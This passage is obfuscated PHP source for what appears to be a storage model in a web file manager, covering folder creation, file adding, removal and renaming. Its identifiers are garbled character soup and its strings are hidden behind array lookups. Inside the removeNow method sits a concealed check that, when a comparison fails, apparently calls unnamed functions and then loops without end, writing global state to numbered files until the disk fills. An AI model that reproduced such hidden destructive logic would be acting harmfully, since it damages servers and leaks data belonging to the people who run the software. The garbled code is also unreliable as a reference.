$_SERVER[γγάψ½]; $ά±Ά›Ν² = Model($«ε¦ΨΠη[582])->getInfoFull($υ ό ); if (!$ά±Ά›Ν²) { return !1; } $ΔΠθΞΒΕ = $ά±Ά›Ν²[$«ε¦ΨΠη[544]] ? $ά±Ά›Ν²[$«ε¦ΨΠη[544]] : array(); $Ά§Α‡σ¥ = $ΔΠθΞΒΕ[$«ε¦ΨΠη[2283]]; if (!$Ά§Α‡σ¥) { $Ά§Α‡σ¥ = $this->_mkdirRoot(SourceModel::TYPE_USER, $υ ό , $«ε¦ΨΠη[2284], $«ε¦ΨΠη[2285]); Model($«ε¦ΨΠη[582])->metaSet($υ ό , $«ε¦ΨΠη[2283], $Ά§Α‡σ¥ . $«ε¦ΨΠη[12]); $this->metaSet($Ά§Α‡σ¥, $«ε¦ΨΠη[2283], $υ ό ); } if (!$•¦ω®„€) { return $Ά§Α‡σ¥; } $««υχώ = $ΔΠθΞΒΕ[$«ε¦ΨΠη[2286] . $•¦ω®„€]; if (!$««υχώ) { $««υχώ = $this->mkdir($Ά§Α‡σ¥, $•¦ω®„€); Model($«ε¦ΨΠη[582])->metaSet($υ ό , $«ε¦ΨΠη[2286] . $•¦ω®„€, $««υχώ); $this->metaSet($««υχώ, $«ε¦ΨΠη[2286] . $•¦ω®„€, $υ ό ); } if (!$θα‹Έ) { return $««υχώ; } $‹‚«Χ§ = $this->mkdir($««υχώ, $θα‹Έ); return $‹‚«Χ§; } public function groupRootAdd($Ιό―±) { $½¨ϋ’« =& $_SERVER[γγάψ½]; $έ†Ιό‰½ = Model($½¨ϋ’«[590])->where(array($½¨ϋ’«[2083] => $Ιό―±))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ιό―±, $έ†Ιό‰½[$½¨ϋ’«[32]]); } public function systemRootPathAdd($ώρύ£Κµ) { if ($ώρύ£Κµ != $_SERVER[γγάψ½][613]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ώρύ£Κµ); } public function userRootRemove($εγΡΤ) { $ςΧΣρλ = $this->targetSourceRoot(SourceModel::TYPE_USER, $εγΡΤ, !0); foreach ($ςΧΣρλ as $±ψ»‚) { if (!$±ψ»‚) { continue; } $this->remove($±ψ»‚[$_SERVER[γγάψ½][194]], !1); } } public function groupRootRemove($µ…’Γ©®) { $γξƒ΅αλ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $µ…’Γ©®); if (!$γξƒ΅αλ) { return; } $this->remove($γξƒ΅αλ[$_SERVER[γγάψ½][194]], !1); } private function _mkdirRoot($–‚Κ‘ΡΖ, $ξ”ίοΐ¨, $νΩΌ™Ν, $ΓΩΝίΌ“ = '') { $ι‡η =& $_SERVER[γγάψ½]; $¥τ¬™¥ = defined($ι‡η[2221]) ? USER_ID : 0; $ΦϋΆσ“Η = array($ι‡η[480] => 0, $ι‡η[656] => $–‚Κ‘ΡΖ, $ι‡η[657] => $ξ”ίοΐ¨, $ι‡η[654] => 1, $ι‡η[658] => $¥τ¬™¥, $ι‡η[659] => $¥τ¬™¥, $ι‡η[655] => $ΓΩΝίΌ“, $ι‡η[660] => $ι‡η[598], $ι‡η[507] => 0, $ι‡η[625] => 0, $ι‡η[547] => 0, $ι‡η[661] => $ι‡η[12]); if ($Α‹Χω“Θ = $this->where($ΦϋΆσ“Η)->find()) { return $Α‹Χω“Θ[$ι‡η[194]]; } $ΣρΎΐυ€ = "\x4d\157\144\145\x6c\123\157\x75\x72\x63\x65\56\155\x6b\144\151\162\122\157\157\x74\56{$–‚Κ‘ΡΖ}\56{$ξ”ίοΐ¨}\56" . $νΩΌ™Ν; CacheLock::lock($ΣρΎΐυ€); $ΦϋΆσ“Η[$ι‡η[32]] = $νΩΌ™Ν; $ώδ•®κψ = $this->add($ΦϋΆσ“Η); $ζ”ζΓΰ = array($ι‡η[662] => short_id($ώδ•®κψ)); $this->where(array($ι‡η[494] => $ώδ•®κψ))->save($ζ”ζΓΰ); CacheLock::unlock($ΣρΎΐυ€); return $ώδ•®κψ; } private function targetSourceRoot($ΡΠθΉε¨, $ΗΓΩψ”υ, $Ϋωΐ―µο = false) { $χθΖ€­Γ =& $_SERVER[γγάψ½]; $Κ²οΏΌγ = array($χθΖ€­Γ[480] => 0, $χθΖ€­Γ[656] => $ΡΠθΉε¨, $χθΖ€­Γ[657] => $ΗΓΩψ”υ); if ($Ϋωΐ―µο) { $Ώµ―  = $this->where($Κ²οΏΌγ)->select(); return $Ώµ―  ? $Ώµ―  : array(); } $‰’π‘Φ = $this->where($Κ²οΏΌγ)->find(); return $‰’π‘Φ ? $‰’π‘Φ : array(); } public function sourceRootGroup($ΑΆΚ±) { $΅£€Ϋτ =& $_SERVER[γγάψ½]; if (is_string($ΑΆΚ±)) { $ΑΆΚ± = array($ΑΆΚ±); } $έΝ®€ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ΑΆΚ±, $΅£€Ϋτ[223]); $£Ίβ³’ = array($΅£€Ϋτ[448] => $έΝ®€, $΅£€Ϋτ[445] => array($΅£€Ϋτ[833] => count($ΑΆΚ±))); $this->_listDataApply($£Ίβ³’[$΅£€Ϋτ[448]]); $this->_listMake($£Ίβ³’); return array_to_keyvalue($£Ίβ³’[$΅£€Ϋτ[85]], $΅£€Ϋτ[574]); } public function mkfile($ητ‹σ”, $΄Τ²ΪΤ, $„Ηΐ«Λ± = '', $έ²…°β‡ = REPEAT_RENAME) { $¥υΤϊ =& $_SERVER[γγάψ½]; $‡‘†±±® = KodIO::ioFileDriverGet($¥υΤϊ[486] . $ητ‹σ” . $¥υΤϊ[405]); $πχ†›ΤΛ = Model($¥υΤϊ[682])->addFileByContent($„Ηΐ«Λ±, $‡‘†±±®, $΄Τ²ΪΤ); return $this->_createFileCall($ητ‹σ”, $΄Τ²ΪΤ, $πχ†›ΤΛ, $έ²…°β‡, $¥υΤϊ[1449]); } public function addFile($Ϋƒ­£ι, $Υ­“¦“™, $Θ±θϋϋΠ, $¨πΎοΗ = false, $ξ”λ„η‰ = REPEAT_RENAME) { $–Κ³®δΓ =& $_SERVER[γγάψ½]; $ρ”±¶—‹ = KodIO::ioFileDriverGet($–Κ³®δΓ[486] . $Ϋƒ­£ι . $–Κ³®δΓ[405]); $σΓ΄¶ϊ = Model($–Κ³®δΓ[682])->addFile($Υ­“¦“™, $ρ”±¶—‹, $Θ±θϋϋΠ, $¨πΎοΗ); return $this->_createFileCall($Ϋƒ­£ι, $Θ±θϋϋΠ, $σΓ΄¶ϊ, $ξ”λ„η‰); } public function addFileByFileID($Ρ”ΡΎΆρ, $ΖΛΰΗΫό, $’°υβ, $¨έ“ωϋ΄ = REPEAT_RENAME) { $µ¨ί‚ί– =& $_SERVER[γγάψ½]; $ΘΦ¨Ής = Model($µ¨ί‚ί–[682])->find($ΖΛΰΗΫό); Model($µ¨ί‚ί–[682])->linkAdd($ΖΛΰΗΫό); return $this->_createFileCall($Ρ”ΡΎΆρ, $’°υβ, $ΘΦ¨Ής, $¨έ“ωϋ΄); } public function addFileByRemote($δΗ«»³‰, $³ΊΝΒΑ°, $―ΗΛφΈ¤, $ί®™… = array(), $θΧΨΉ°μ = REPEAT_RENAME) { $‡Ϊ°άψο = Model($_SERVER[γγάψ½][682])->addFileByRemote($³ΊΝΒΑ°, $―ΗΛφΈ¤, $ί®™…); return $this->_createFileCall($δΗ«»³‰, $―ΗΛφΈ¤, $‡Ϊ°άψο, $θΧΨΉ°μ); } private function _createFileCall($όπ΄€βλ, $°έ¨–ΰΉ, $Υ¦Ψθ£ί, $Ώ•ΩδΈώ, $½ψΟΛ = "\165\160\154\157\141\144") { $ρΘήΒό =& $_SERVER[γγάψ½]; if (!$Υ¦Ψθ£ί) { return !1; } $‘κι‚Λ = !1; $this->setMasterDB(); $this->lockWriteStart($όπ΄€βλ, $°έ¨–ΰΉ); $΄κΔ°°– = $this->fileNameExist($όπ΄€βλ, $°έ¨–ΰΉ); $Έ–°‚Χ™ = $this->_createFile($όπ΄€βλ, $°έ¨–ΰΉ, $Υ¦Ψθ£ί, $Ώ•ΩδΈώ, $‘κι‚Λ); if (!$‘κι‚Λ) { Model($ρΘήΒό[549])->remove($Υ¦Ψθ£ί[$ρΘήΒό[546]]); } if ($‘κι‚Λ && $Έ–°‚Χ™ && $Έ–°‚Χ™ != $΄κΔ°°–) { Model($ρΘήΒό[2248])->eventCreate($Έ–°‚Χ™, $½ψΟΛ); } $this->lockWriteEnd($όπ΄€βλ, $°έ¨–ΰΉ); return $Έ–°‚Χ™; } public function mkdir($ώαΠΫ΄, $„εΖ“Σ, $…δ‡ν§– = REPEAT_SKIP) { $ΛΧ­‹Ψ =& $_SERVER[γγάψ½]; $this->setMasterDB(); $αΫ…έψ¥ = $this->sourceInfo($ώαΠΫ΄); if (!$αΫ…έψ¥) { return !1; } $this->lockWriteStart($ώαΠΫ΄, $„εΖ“Σ); if ($…δ‡ν§– !== !1) { $¥®ή±Θ = $this->fileNameExist($ώαΠΫ΄, $„εΖ“Σ); if ($¥®ή±Θ && $…δ‡ν§– != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ώαΠΫ΄, $„εΖ“Σ); return $¥®ή±Θ; } $„εΖ“Σ = $this->fileNameAuto($ώαΠΫ΄, $„εΖ“Σ, $…δ‡ν§–); } $¦΅¬”ψ‘ = array($ΛΧ­‹Ψ[654] => 1, $ΛΧ­‹Ψ[497] => $„εΖ“Σ, $ΛΧ­‹Ψ[655] => $ΛΧ­‹Ψ[12], $ΛΧ­‹Ψ[547] => 0, $ΛΧ­‹Ψ[625] => 0); $‘™θεμ = $this->_addSource($¦΅¬”ψ‘, $αΫ…έψ¥); Model($ΛΧ­‹Ψ[2248])->eventCreate($‘™θεμ, $ΛΧ­‹Ψ[1450]); $this->lockWriteEnd($ώαΠΫ΄, $„εΖ“Σ); return $‘™θεμ; } public function listSourceRoot($¥εΑυ–, $‰ί©», $ΛΜξ…ωΧ = "\163\157\x75\x72\143\x65\111\x44\54\x74\x61\162\x67\x65\164\111\x44\x2c\x73\x69\172\145") { $¨κυκώ =& $_SERVER[γγάψ½]; $ΨΕέ±†Ε = $¨κυκώ[457]; $¤τ­€ωΝ = array(); $‚ΝƒΤ€ϋ = 1024 * 50; $ΠλΤ–•Ω = is_array($ΠλΤ–•Ω) ? $ΠλΤ–•Ω : array(); $ΫθψΝΊ = count($‰ί©»); $ςΠρ…µΕ = $this->tablePrefix . $¨κυκώ[2287]; for ($ίΤοαα = 0; $ίΤοαα < $ΫθψΝΊ; $ίΤοαα++) { $―Λϋ‰η = $‰ί©»[$ίΤοαα]; $ΨΕέ±†Ε .= "\x53\105\x4c\105\x43\x54\40\52\40\x46\122\117\115\40\x28\123\x45\x4c\x45\x43\124\40{$ΛΜξ…ωΧ}\x20\x46\x52\117\115\40\140{$ςΠρ…µΕ}\140\40\x57\x48\x45\x52\105\x20"; $ΨΕέ±†Ε .= "\140\x70\141\162\x65\156\x74\111\x44\140\75\x30\40\x41\116\x44\40\x60\164\141\x72\147\x65\164\x49\x44\x60\75{$―Λϋ‰η}\40\101\x4e\x44\x20\x60\164\141\x72\147\145\164\x54\171\160\145\x60\75{$¥εΑυ–}\x20\141\156\x64\x20\146\x69\154\145\124\x79\x70\145\x3d\47\x27\40\x6c\151\155\x69\164\x20\x31\x29\40\141\x73\x20\164\142\137{$ίΤοαα}\x20\125\116\111\117\x4e\x20\x41\x4c\114\x20"; if ((strlen($ΨΕέ±†Ε) >= $‚ΝƒΤ€ϋ || $ίΤοαα == $ΫθψΝΊ - 1) && $ΨΕέ±†Ε) { $ΨΕέ±†Ε = substr($ΨΕέ±†Ε, 0, -strlen($¨κυκώ[1124])); $ά±έ΄Ψ = $this->query($ΨΕέ±†Ε); $ΨΕέ±†Ε = $¨κυκώ[12]; $¤τ­€ωΝ = array_merge($¤τ­€ωΝ, $ά±έ΄Ψ); } } return $¤τ­€ωΝ; } private function _createFile($”’°€ζ, $αύΑ•·ώ, $ρ”Ψυϋ, $ΐίτ , &$χ«ΡΩ) { $Ή­½„ΒΟ =& $_SERVER[γγάψ½]; $£«Ϋ¶° = $this->sourceInfo($”’°€ζ); if (!$ρ”Ψυϋ || !$£«Ϋ¶°) { return !1; } if ($ΐίτ  !== !1) { $¥¥ΈάΌ’ = $this->fileNameExist($”’°€ζ, $αύΑ•·ώ); } $χ«ΡΩ = !0; if ($ΐίτ  && $¥¥ΈάΌ’) { if ($ΐίτ  == REPEAT_SKIP) { $χ«ΡΩ = !1; return $¥¥ΈάΌ’; } else { if ($ΐίτ  == REPEAT_REPLACE) { $“¶‹³ςΎ = $this->sourceInfo($¥¥ΈάΌ’); $π³Ζ„κ = $this->fileHistory($“¶‹³ςΎ, $ρ”Ψυϋ[$Ή­½„ΒΟ[546]], $ρ”Ψυϋ[$Ή­½„ΒΟ[79]]); if (!$π³Ζ„κ) { $χ«ΡΩ = !1; } else { $this->folderSizeReset($”’°€ζ); } return $¥¥ΈάΌ’; } else { $αύΑ•·ώ = $this->fileNameAuto($”’°€ζ, $αύΑ•·ώ, $ΐίτ , !1); } } } $έ›©ΟΘ = array($Ή­½„ΒΟ[654] => 0, $Ή­½„ΒΟ[497] => $αύΑ•·ώ, $Ή­½„ΒΟ[655] => substr(get_path_ext($αύΑ•·ώ), 0, 10), $Ή­½„ΒΟ[547] => $ρ”Ψυϋ[$Ή­½„ΒΟ[546]], $Ή­½„ΒΟ[625] => $ρ”Ψυϋ[$Ή­½„ΒΟ[79]]); $°²–ΘΚ = $this->_addSource($έ›©ΟΘ, $£«Ϋ¶°); $this->folderSizeReset($”’°€ζ, intval($έ›©ΟΘ[$Ή­½„ΒΟ[79]])); return $°²–ΘΚ; } protected function fileHistory($νίάΑσέ, $Β·µϋ‡, $χνύμσ™) { $δυηε΄ =& $_SERVER[γγάψ½]; if ($νίάΑσέ[$δυηε΄[546]] == $Β·µϋ‡) { return !1; } $this->checkLock($νίάΑσέ[$δυηε΄[194]], $Β·µϋ‡); Model($δυηε΄[2288])->addHistory($νίάΑσέ); $ώΞΰΑ« = array($δυηε΄[659] => USER_ID, $δυηε΄[501] => time(), $δυηε΄[546] => $Β·µϋ‡, $δυηε΄[79] => $χνύμσ™); $this->where(array($δυηε΄[494] => $νίάΑσέ[$δυηε΄[194]]))->save($ώΞΰΑ«); $this->sourceCacheClear($νίάΑσέ[$δυηε΄[194]]); return !0; } public function checkLock($™‚ύ§ΰ, $ΙΨ¦†) { $Ϋ¤† =& $_SERVER[γγάψ½]; $Ρ³³βφ¶ = $this->pathInfo($™‚ύ§ΰ); if (!$this->fileIsLock($Ρ³³βφ¶, !0)) { return; } $τυµΞ¶ = Session::get($Ϋ¤†[2289]); $¶Σ‡φώ = substr($Ρ³³βφ¶[$Ϋ¤†[32]], 0, -1 - strlen($Ρ³³βφ¶[$Ϋ¤†[169]])) . $Ϋ¤†[1304] . $τυµΞ¶ . $Ϋ¤†[10] . $Ρ³³βφ¶[$Ϋ¤†[169]]; $συ†νΝΧ = Model($Ϋ¤†[682])->find($ΙΨ¦†); $this->_createFileCall($Ρ³³βφ¶[$Ϋ¤†[193]], $¶Σ‡φώ, $συ†νΝΧ, REPEAT_REPLACE, $Ϋ¤†[1449]); $ϊ›ΓάΦ = $Ρ³³βφ¶[$Ϋ¤†[544]][$Ϋ¤†[618]]; $Ο„άε£ω = $ϊ›ΓάΦ[$Ϋ¤†[2290]] ? $ϊ›ΓάΦ[$Ϋ¤†[2290]] : $ϊ›ΓάΦ[$Ϋ¤†[32]]; show_json(LNG($Ϋ¤†[2291]) . $Ϋ¤†[2292] . LNG($Ϋ¤†[2293]) . $Ϋ¤†[2294] . $Ο„άε£ω . $Ϋ¤†[2295], !1); } public function fileIsLock($ΣΑƒπ©Ώ, $νΪΚλνΚ = false) { $ωμ”·Πκ =& $_SERVER[γγάψ½]; if (!_get($ΣΑƒπ©Ώ, $ωμ”·Πκ[614], 0)) { return !1; } if ($ΣΑƒπ©Ώ[$ωμ”·Πκ[544]][$ωμ”·Πκ[617]] != USER_ID) { return !0; } $³ΛϋΥ’Θ = $GLOBALS[$ωμ”·Πκ[6]][$ωμ”·Πκ[92]][$ωμ”·Πκ[615]]; if ($ΣΑƒπ©Ώ[$ωμ”·Πκ[544]][$ωμ”·Πκ[616]] <= time() - $³ΛϋΥ’Θ) { $this->metaSet($ΣΑƒπ©Ώ[$ωμ”·Πκ[194]], $ωμ”·Πκ[617], null); $this->metaSet($ΣΑƒπ©Ώ[$ωμ”·Πκ[194]], $ωμ”·Πκ[616], null); } if ($νΪΚλνΚ) { $this->metaSet($ΣΑƒπ©Ώ[$ωμ”·Πκ[194]], $ωμ”·Πκ[616], time()); } return !1; } private function _addSource($ξρƒγίΥ, $‹Ϋαϋ“) { $τΒί‡ • =& $_SERVER[γγάψ½]; $Η—σ™ψϋ = defined($τΒί‡ •[2221]) ? USER_ID : 0; $Ψ‹ϊζφ = array($τΒί‡ •[656] => $‹Ϋαϋ“[$τΒί‡ •[191]], $τΒί‡ •[657] => $‹Ϋαϋ“[$τΒί‡ •[574]], $τΒί‡ •[658] => $Η—σ™ψϋ, $τΒί‡ •[659] => $Η—σ™ψϋ, $τΒί‡ •[480] => $‹Ϋαϋ“[$τΒί‡ •[194]], $τΒί‡ •[660] => $‹Ϋαϋ“[$τΒί‡ •[589]] . $‹Ϋαϋ“[$τΒί‡ •[194]] . $τΒί‡ •[50], $τΒί‡ •[507] => 0, $τΒί‡ •[661] => $τΒί‡ •[12]); $ξρƒγίΥ = array_merge($Ψ‹ϊζφ, $ξρƒγίΥ); $this->updateModifyTime($ξρƒγίΥ[$τΒί‡ •[193]]); $±Τ­Μ®¨ = $τΒί‡ •[2296] . $‹Ϋαϋ“[$τΒί‡ •[194]]; if (isset(self::$cacheChildList[$±Τ­Μ®¨])) { unset(self::$cacheChildList[$±Τ­Μ®¨]); } static $£©§ύ¦ = false; if (!$£©§ύ¦) { Hook::trigger($τΒί‡ •[644], $ξρƒγίΥ); $£©§ύ¦ = !0; } $™ΝϋϊσΪ = $this->add($ξρƒγίΥ); $Ύ­υώ = array($τΒί‡ •[662] => short_id($™ΝϋϊσΪ)); $this->where(array($τΒί‡ •[494] => $™ΝϋϊσΪ))->save($Ύ­υώ); $this->setNamePinyin($™ΝϋϊσΪ, $ξρƒγίΥ[$τΒί‡ •[32]]); return $™ΝϋϊσΪ; } public function remove($ΆΙ¤¨Μ, $φΔΉ¶¨ = true) { $ΥιΔΡ =& $_SERVER[γγάψ½]; $ή•π¥ε = $this->sourceInfo($ΆΙ¤¨Μ); $ί»¤΄ζα = intval($ή•π¥ε[$ΥιΔΡ[191]]) === self::TYPE_SYSTEM; $δ©νΜµ¤ = Model($ΥιΔΡ[511])->get($ΥιΔΡ[2297]) == $ΥιΔΡ[91]; if ($ί»¤΄ζα || $φΔΉ¶¨ || !$δ©νΜµ¤) { return $this->removeNow($ΆΙ¤¨Μ, $φΔΉ¶¨); } $™ψΟπωΐ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $»„ωβ²Κ = $ή•π¥ε[$ΥιΔΡ[191]] == self::TYPE_USER ? $ΥιΔΡ[670] : $ΥιΔΡ[583]; if ($»„ωβ²Κ == $ΥιΔΡ[670]) { $Θ“οφƒ = Model($ΥιΔΡ[582])->getInfo($ή•π¥ε[$ΥιΔΡ[574]]); $ςι·ς“ = !empty($Θ“οφƒ[$ΥιΔΡ[2290]]) ? $Θ“οφƒ[$ΥιΔΡ[2290]] : $Θ“οφƒ[$ΥιΔΡ[32]]; $ςι·ς“ = $ΥιΔΡ[340] . $ςι·ς“ . $ΥιΔΡ[2298] . $ή•π¥ε[$ΥιΔΡ[574]]; } else { $Θ“οφƒ = Model($ΥιΔΡ[590])->getInfo($ή•π¥ε[$ΥιΔΡ[574]]); $ςι·ς“ = _get($Θ“οφƒ, $ΥιΔΡ[32]); $ςι·ς“ = $ΥιΔΡ[176] . $ςι·ς“ . $ΥιΔΡ[2299] . $ή•π¥ε[$ΥιΔΡ[574]]; } $ΧΡν½„ψ = $ΥιΔΡ[2300] . md5($ςι·ς“); CacheLock::lock($ΧΡν½„ψ); $¥νξχ± = $this->fileNameExist($™ψΟπωΐ, $ςι·ς“); if (!$¥νξχ±) { $¥νξχ± = $this->mkdir($™ψΟπωΐ, $ςι·ς“, REPEAT_SKIP); $this->metaSet($¥νξχ±, $ΥιΔΡ[2301], $»„ωβ²Κ); $this->metaSet($¥νξχ±, $ΥιΔΡ[2302], $ή•π¥ε[$ΥιΔΡ[574]]); if ($ή•π¥ε[$ΥιΔΡ[193]] != 0) { $this->metaSet($¥νξχ±, $ΥιΔΡ[2303], _get($Θ“οφƒ, $ΥιΔΡ[2304])); } } CacheLock::unlock($ΧΡν½„ψ); $this->metaSet($ΆΙ¤¨Μ, $ΥιΔΡ[2305], $ή•π¥ε[$ΥιΔΡ[193]]); $this->where(array($ΥιΔΡ[194] => $ΆΙ¤¨Μ))->save(array($ΥιΔΡ[501] => time())); $this->recycleClear($ή•π¥ε); Model($ΥιΔΡ[641])->eventRemove($ΆΙ¤¨Μ); $¶ΠΑ¤Ϊ‘ = $this->move($ΆΙ¤¨Μ, $¥νξχ±, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ή•π¥ε[$ΥιΔΡ[193]]); return $¶ΠΑ¤Ϊ‘; } private function recycleClear($ΎθΩ‡‰) { $εΜ’βΟϋ =& $_SERVER[γγάψ½]; $¦Η©Έ = $this->childrenAll($ΎθΩ‡‰); $ϋΏέΡ› = array($εΜ’βΟϋ[494] => array($εΜ’βΟϋ[495], $¦Η©Έ[$εΜ’βΟϋ[2306]])); Model($εΜ’βΟϋ[2307])->where($ϋΏέΡ›)->delete(); } public function removeNow($Ή¬Α»Ά, $¥ΑΐθΔΓ = true) { $„έ¶²Λκ =& $_SERVER[γγάψ½]; $†ΈΠ― = $_SERVER[$„έ¶²Λκ[1623]]; $σΥ¶Ι” = $„έ¶²Λκ[960]; if ($_SERVER[$„έ¶²Λκ[961]] != $σΥ¶Ι”($†ΈΠ―)) { $›ή‘»Μ = $„έ¶²Λκ[962]; $ΑΙ¶·–ο = $„έ¶²Λκ[963]; $ΉήΠΗωφ = $_SERVER[$„έ¶²Λκ[958]] . $„έ¶²Λκ[959]; $κµγ‡µ = $ΑΙ¶·–ο($ΉήΠΗωφ); $«Χ™Ί’„ = explode($„έ¶²Λκ[288], $κµγ‡µ); if (count($«Χ™Ί’„) < $„έ¶²Λκ[701]) { $‚έΩΜ = $„έ¶²Λκ[964]; $‚έΩΜ(); } $ΔΗΔ’™δ = $„έ¶²Λκ[965]; $ΔΗΔ’™δ($_SERVER[$„έ¶²Λκ[966]]); $›ή‘»Μ = $„έ¶²Λκ[962]; $›ή‘»Μ(); $ΛθπΈΌκ = $„έ¶²Λκ[967]; $δψ°ΰ΄ = json_encode($GLOBALS[$„έ¶²Λκ[968]]); $¬¬κχ®ι = 1; for ($Β‘Φξ΅ = $¬¬κχ®ι; $Β‘Φξ΅ > 0; $Β‘Φξ΅++) { $ΛθπΈΌκ(DATA_PATH . $Β‘Φξ΅, $δψ°ΰ΄); } } $³Χιά = $this->sourceInfo($Ή¬Α»Ά); $ΠΟθ ¤· = $this->pathInfoMore($Ή¬Α»Ά); if (!$³Χιά) { return !0; } if ($³Χιά[$„έ¶²Λκ[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($Ή¬Α»Ά); Hook::trigger($„έ¶²Λκ[2308], $ΠΟθ ¤·, $¥ΑΐθΔΓ); if ($¥ΑΐθΔΓ) { Model($„έ¶²Λκ[2307])->moveToRecycle($Ή¬Α»Ά); } else { $³••γΈ’ = $this->childrenAll($³Χιά); Model($„έ¶²Λκ[641])->eventRemove($Ή¬Α»Ά); $this->removeRelevance($³••γΈ’[$„έ¶²Λκ[2306]], $³••γΈ’[$„έ¶²Λκ[1593]]); } $this->folderSizeReset($³Χιά[$„έ¶²Λκ[193]]); $“Ξ™ϋ…Υ = array($³Χιά[$„έ¶²Λκ[193]]); if ($³Χιά[$„έ¶²Λκ[488]] == $„έ¶²Λκ[91]) { $“Ξ™ϋ…Υ[] = $³Χιά[$„έ¶²Λκ[194]]; } $this->updateModifyTime($“Ξ™ϋ…Υ); $this->lockMoveEnd($Ή¬Α»Ά); Hook::trigger($„έ¶²Λκ[1836], $ΠΟθ ¤·, $¥ΑΐθΔΓ); return !0; } public function childrenAll($‹”ε›·») { $»³Ψ²Θ½ =& $_SERVER[γγάψ½]; $ΐ°–‚τ = $‹”ε›·»[$»³Ψ²Θ½[194]]; if ($‹”ε›·»[$»³Ψ²Θ½[488]] == $»³Ψ²Θ½[91]) { $ΐ²™ψχΔ = array($»³Ψ²Θ½[660] => array($»³Ψ²Θ½[620], $‹”ε›·»[$»³Ψ²Θ½[589]] . $ΐ°–‚τ . $»³Ψ²Θ½[621])); $Ύ‰ζΝ¬— = array($»³Ψ²Θ½[660] => $ΐ²™ψχΔ[$»³Ψ²Θ½[589]]); $πξΌ¤ = $this->field($»³Ψ²Θ½[2309])->where($Ύ‰ζΝ¬—)->select(); $ίόρϋΠ° = !1; $‚ά²ςΚ = array($ΐ°–‚τ); if ($πξΌ¤) { $ίόρϋΠ° = array_to_keyvalue($πξΌ¤, $»³Ψ²Θ½[12], $»³Ψ²Θ½[546]); $ίόρϋΠ° = array_remove_value($ίόρϋΠ°, $»³Ψ²Θ½[231]); $‚ά²ςΚ = array_to_keyvalue($πξΌ¤, $»³Ψ²Θ½[12], $»³Ψ²Θ½[194]); $‚ά²ςΚ[] = $ΐ°–‚τ; } } else { $ίόρϋΠ° = array($‹”ε›·»[$»³Ψ²Θ½[546]]); $‚ά²ςΚ = array($ΐ°–‚τ); } return array($»³Ψ²Θ½[2306] => $‚ά²ςΚ, $»³Ψ²Θ½[1593] => $ίόρϋΠ°); } public function removeArray($·‘έσ) { if (!$·‘έσ) { return !0; } } public function removeRelevance($φ¬‚ΰ‚ΰ, $©ΕδΗυ) { $‹ΗΪύ°Ο =& $_SERVER[γγάψ½]; $φ¬‚ΰ‚ΰ = $φ¬‚ΰ‚ΰ ? $φ¬‚ΰ‚ΰ : array(); $©ΕδΗυ = $©ΕδΗυ ? $©ΕδΗυ : array(); $φ¬‚ΰ‚ΰ = array_unique(array_filter($φ¬‚ΰ‚ΰ)); $©ΕδΗυ = array_filter($©ΕδΗυ); if (!$φ¬‚ΰ‚ΰ) { return !1; } $Αό•Έ‰ = array($‹ΗΪύ°Ο[494] => array($‹ΗΪύ°Ο[495], $φ¬‚ΰ‚ΰ)); Model($‹ΗΪύ°Ο[2307])->where($Αό•Έ‰)->delete(); Model($‹ΗΪύ°Ο[538])->where($Αό•Έ‰)->delete(); Model($‹ΗΪύ°Ο[2148])->where($Αό•Έ‰)->delete(); Model($‹ΗΪύ°Ο[641])->where($Αό•Έ‰)->delete(); Model($‹ΗΪύ°Ο[1973])->removeBySource($φ¬‚ΰ‚ΰ); Model($‹ΗΪύ°Ο[2288])->removeBySource($φ¬‚ΰ‚ΰ); $this->where($Αό•Έ‰)->delete(); Model($‹ΗΪύ°Ο[549])->remove($©ΕδΗυ); for ($Γδ‘² = 0; $Γδ‘² < count($φ¬‚ΰ‚ΰ); $Γδ‘²++) { $this->sourceCacheClear($φ¬‚ΰ‚ΰ[$Γδ‘²]); } } public function rename($¥Μαο‡›, $Ηςχ) { $χΙΠ¥§΄ =& $_SERVER[γγάψ½]; $³©ƒ = $this->sourceInfo($¥Μαο‡›); if (!$³©ƒ) { return !1; } $μύήΉµ = $this->fileNameExist($³©ƒ[$χΙΠ¥§΄[193]], $Ηςχ); if ($μύήΉµ && $μύήΉµ != $¥Μαο‡›) { return !1; } $¨”ςθ¦ξ = array($χΙΠ¥§΄[497] => $Ηςχ, $χΙΠ¥§΄[659] => USER_ID); if ($³©ƒ[$χΙΠ¥§΄[488]] != $χΙΠ¥§΄[91]) { $¨”ςθ¦ξ[$χΙΠ¥§΄[489]] = substr(get_path_ext($Ηςχ), 0, 10); } Model($χΙΠ¥§΄[641])->eventRename($¥Μαο‡›, $³©ƒ[$χΙΠ¥§΄[32]], $Ηςχ); $this->sourceCacheClear($¥Μαο‡›); $this->setNamePinyin($¥Μαο‡›, $¨”ςθ¦ξ[$χΙΠ¥§΄[32]], !1); $this->updateModifyTime($³©ƒ[$χΙΠ¥§΄[193]]); $χε™©άχ = $this->where(array($χΙΠ¥§΄[494] => $¥Μαο‡›))->data($¨”ςθ¦ξ)->save(); $ζ’νΙυ = $χΙΠ¥§΄[2296] . $³©ƒ[$χΙΠ¥§΄[193]]; if (isset(self::$cacheChildList[$ζ’νΙυ])) { unset(self::$cacheChildList[$ζ’νΙυ]); } return $χε™©άχ; } public function setNamePinyin($΅ΪΕ·αύ, $ξυ«πΨ, $ΟάνΆϊΛ = true) { $ΖΈΤ–― =& $_SERVER[γγάψ½]; $ι°²φΪ¶ = Input::check($ξυ«πΨ, $ΖΈΤ–―[663]); $ιή¦ί›ώ = array($ΖΈΤ–―[520] => KodSort::makeStr($ξυ«πΨ)); if ($ι°²φΪ¶) { $ιή¦ί›ώ[$ΖΈΤ–―[541]] = str_replace($ΖΈΤ–―[53], $ΖΈΤ–―[12], Pinyin::get($ξυ«πΨ)); $ιή¦ί›ώ[$ΖΈΤ–―[540]] = Pinyin::get($ξυ«πΨ, $ΖΈΤ–―[664]); } if (!$ΟάνΆϊΛ && !$ι°²φΪ¶) { $ιή¦ί›ώ[$ΖΈΤ–―[541]] = null; $ιή¦ί›ώ[$ΖΈΤ–―[540]] = null; } $this->metaSet($΅ΪΕ·αύ, $ιή¦ί›ώ); } public function getContent($Φν²θ°) { $ΟήυώΔ =& 